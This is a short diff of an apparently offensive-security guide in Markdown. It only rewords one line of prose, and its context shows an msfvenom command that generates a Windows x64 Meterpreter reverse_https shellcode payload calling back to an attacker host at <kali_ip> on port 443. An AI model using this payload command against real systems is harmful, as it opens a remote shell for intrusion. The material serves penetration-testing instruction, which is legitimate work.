@@ -6,7 +6,7 @@
 </script>
 ```
 
-> Afterwards you can generate a file which can give a reverse shell:
+> Afterwards you can generate shellcode for a reverse shell:
 
 ```
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<kali_ip> LPORT=443 -f csharp
